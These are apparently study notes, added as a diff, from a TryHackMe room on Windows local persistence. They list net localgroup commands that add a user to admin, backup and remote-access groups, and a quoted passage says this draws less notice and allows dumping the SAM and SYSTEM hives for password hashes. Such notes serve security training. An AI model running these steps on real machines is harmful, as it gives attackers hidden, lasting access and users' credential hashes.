@@ -1,0 +1,22 @@
+from: Windows Local Persistence - https://tryhackme.com/room/windowslocalpersistence
+
+Assign Group Memberships
+------------------------
+Note: you need access with an account with administrator privileges to do the following commands.
+
+C:\> net localgroup administrators <username> /add
+- add an unprivileged user to the administrators group in order to give them administrative privileges
+
+C:\> net localgroup "Backup Operators" <username> /add
+- adding a user to this group, instead of Administrators may look less suspicious
+- "Users in this group won't have administrative privileges but will be allowed to read/write any file or registry key on the system, ignoring any configured DACL. This would allow us to copy the content of the SAM and SYSTEM registry hives, which we can then use to recover the password hashes for all the users, enabling us to escalate to any administrative account trivially."
+
+C:\> net localgroup "Remote Management Users" <username> /add
+- add user to Remote Management Users (WinRM) group
+- allows user to log in remotely to this machine using WinRM
+
+C:\> net localgroup "Remote Desktop Users" <username> /add
+- add user to Remote Desktop Users (RDP) group
+- allows user to log in remotely to this machine using RDP
+
+
